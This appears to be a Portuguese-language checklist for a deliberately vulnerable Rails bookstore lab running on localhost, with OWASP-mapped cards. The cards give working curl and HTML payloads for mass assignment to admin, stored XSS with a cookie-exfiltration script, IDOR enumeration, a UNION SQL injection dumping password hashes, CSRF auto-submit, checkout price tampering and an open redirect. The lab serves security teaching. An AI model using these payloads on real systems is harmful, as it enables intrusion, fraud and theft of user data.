BookStore Attack Lab
Missão única em camadas — da conta ao checkout, contra uma loja que confia demais no cliente.
Cenário: a rival BookRip quer vitória fácil: roubar dados, fraudar pedidos e plantar narrativa falsa. Cada cartão abaixo é um ângulo realista; alguns encadeiam naturalmente (ex.: sessão privilegiada depois do login). Ferramentas típicas: navegador · curl · opcionalmente bin/rails runner onde indicado.
// antes de começar — preparação
Rode na raiz do projeto (uma vez): bin/rails db:prepare db:seed
Credenciais de exemplo no seed: admin@bookstore.com / password123 · alice@user.com / pass123 · bob@user.com / pass123
Servidor: http://localhost:3000. Reinicie rails s após mudanças em código.
Este checklist cobre 9 falhas documentadas (checkout junta preço + status em um item).
// sessão Alice · alice_cookies.txt (reutilize nos itens que precisam de cookie)
curl -c alice_cookies.txt -X POST http://localhost:3000/login \
  --data-urlencode "email=alice@user.com" \
  --data-urlencode "password=pass123"
Armadilhas comuns
  • '+--+ no curl não vira comentário SQL como no navegador; prefira payloads com OR e --data-urlencode.
  • Login SQLi com '-- pode gerar 500 neste lab — o cartão 01 usa um OR estável.
  • document.cookie vazio na XSS é esperado se o cookie de sessão for HttpOnly (defesa real — o XSS continua grave).
  • Item com comentário do Bob: rode db:seed no repo atualizado.

02
Mass Assignment — Criar Admin
A04 · Insecure Design O cadastro aceita campos que deveriam ser só servidor-side (papel, saldo).
alvo: POST /users · campos role e credits
// modo descoberta — sem colar payload
Inspecione o que o signup envia. Quais chaves em user[…] o servidor realmente aplica ao criar a conta?
// PoC — payload
# Email único por execução (evita 422 por uniqueness): LAB_EMAIL="h-$(date +%s)@evil.com" curl -X POST http://localhost:3000/users \ --data-urlencode "user[name]=Hacker" \ --data-urlencode "user[email]=$LAB_EMAIL" \ --data-urlencode "user[password]=123" \ --data-urlencode "user[role]=admin" \ --data-urlencode "user[credits]=999999" # Console: User.order(created_at: :desc).first.role
✓ Sucesso: último usuário criado com role admin e credits elevados.
Encadeamento: conta nova admin também abre caminho para painéis restritos.

03
XSS Stored — Comentários
A03 · Injection Conteúdo de usuário tratado como HTML — o navegador executa marcas perigosas.
alvo: POST /books/:id/comments · campo body
// modo descoberta — sem colar payload
Onde o comentário reaparece na página do livro? O servidor escapa HTML por padrão — o que muda quando alguém marca o campo como “seguro” ou usa helpers equivalentes?

Nível extra: teste também um vetor sem <script>, por exemplo atributo de evento em tag permitida — útil quando filtros bloqueiam só script.
// PoC — payload base
<script>alert('XSS — cookie: ' + document.cookie)</script> # Variante “nível 2” (event handler): <img src=x onerror="alert('xss-event')"> # HttpOnly: sessão pode não aparecer em document.cookie; XSS continua válido como execução arbitrária. # Exfil tráfego (cookies não-HttpOnly): <script>new Image().src='http://localhost:9999/?c='+document.cookie</script> python3 -m http.server 9999
✓ Sucesso: execução ao abrir a página do livro (alert ou event handler).
04
IDOR — Pedidos de outros usuários
A01 · Broken Access Control O recurso é carregado só pelo ID — falta verificar se o pedido pertence ao usuário atual.
alvo: GET /orders/:id
// modo descoberta — sem colar payload
Em ambientes de demo, IDs são pequenos e previsíveis. Como você passaria de “só meus pedidos” para “qualquer pedido existente” sem permissão extra?

Dica de mindset: enumeração sistemática (loop ou sequência) costuma achar alvos antes de payloads “inteligentes”.
// PoC — enumerar IDs (expanda o intervalo se precisar)
# Use alice_cookies.txt da preparação. for i in $(seq 1 12); do echo "=== /orders/$i ===" curl -s -b alice_cookies.txt http://localhost:3000/orders/$i | grep -Eo '[a-z0-9._%+-]+@[a-z0-9.-]+\.[a-z]{2,}' done
✓ Sucesso: email ou dados de pedido de outro usuário no HTML (ex.: bob@user.com).
// C · Mesma raiz SQLi, superfície read-only
05
SQL Injection — Campo de busca
A03 · Injection Mesmo anti-padrão do item 01: string interpolada na SQL — aqui em leitura / busca.
alvo: GET /search?q= · UNION-based dump
// modo descoberta — puzzle do UNION
Um UNION só funciona se o número e os tipos das colunas baterem com o SELECT original dos livros. Como você descobriria quantas colunas existem sem olhar o código-fonte?

Abordagem clássica: tentar UNION SELECT NULL, NULL, … aumentando até a busca responder sem erro (neste lab, 9 colunas = tabela books).
// PoC — dump de usuários (9 colunas)
curl --get http://localhost:3000/search \ --data-urlencode "q=' UNION SELECT id,email,password_digest,name,1.0,role,credits,datetime('now'),datetime('now') FROM users -- "
✓ Sucesso: dados de usuários misturados aos cards de livro na resposta HTML.
// D · Integridade web & checkout
06
CSRF ausente — navegador & servidor
A05 · Misconfiguration Proteção contra falsificação de requisição desligada — mudanças de estado aceitas sem token anti-CSRF.
alvo: ApplicationController · verify_authenticity_token ignorado
// modo descoberta — por que “curl com cookie” não é o único cenário
CSRF real costuma ser um site atacante que seu navegador visita enquanto você ainda tem sessão na loja: um <form> que envia POST automaticamente. O curl abaixo prova o lado servidor; o HTML prova o fluxo browser.

Salve o snippet como evil-csrf.html, abra no navegador estando logado em localhost em outra aba (comportamento pode variar por SameSite/navegador — compare com o PoC curl).
// PoC A — página HTML maliciosa (auto-submit)
<form id="x" action="http://localhost:3000/orders" method="POST">   <input name="total" value="0.77">   <input name="address" value="BookRip CSRF">   <input name="card_number" value="4111111111111111"> </form> <script>document.getElementById('x').submit()</script>
// PoC B — curl (sem Authenticity-Token, cookie Alice da preparação)
curl -b alice_cookies.txt -X POST http://localhost:3000/orders \ --data-urlencode "total=0.50" \ --data-urlencode "address=Rua CSRF" \ --data-urlencode "card_number=4111111111111111"
✓ Sucesso: novo pedido criado sem token CSRF (via HTML ou 302 no curl).

A04 · Insecure Design O servidor confia em campos que deveriam ser calculados no backend ou por máquina de estados.
alvo: POST /orders · parâmetros total e status
// modo descoberta — sem colar payload
Se você controlasse o corpo bruto do POST de checkout, quais campos “financeiros” ou de logística não deveriam jamais vir do cliente?
// PoC A — total arbitrário
curl -b alice_cookies.txt -X POST http://localhost:3000/orders \ --data-urlencode "total=0.01" \ --data-urlencode "address=Endereco fake" \ --data-urlencode "card_number=4242424242424242"
✓ Sucesso (A): página do pedido mostra total 0.01.
// PoC B — status entregue sem fluxo real
curl -b alice_cookies.txt -X POST http://localhost:3000/orders \ --data-urlencode "total=10" \ --data-urlencode "address=Rua Status" \ --data-urlencode "card_number=4000000000000002" \ --data-urlencode "status=delivered"
✓ Sucesso (B): novo pedido aparece como delivered imediatamente.
08
Open Redirect — phishing pós-login
A01 · Broken Access Control Destino do redirect após login veio do cliente — link “confiável” pode mandar para clone malicioso.
alvo: POST /login · parâmetro return_to
// modo descoberta — narrativa phishing
Imagine um email: “confirme sua conta na BookStore” com um POST ou formulário que já inclui credenciais falsas — ou combine com login legítimo e observe para onde o app redireciona após sucesso. Um operador combina isso com página clone para roubar sessão ou segunda senha.
// PoC — inspecionar Location
curl -s -D - -o /dev/null -X POST http://localhost:3000/login \ --data-urlencode "email=alice@user.com" \ --data-urlencode "password=pass123" \ --data-urlencode "return_to=https://example.com/phish"
✓ Sucesso: HTTP 302 com Location para o host externo malicioso.
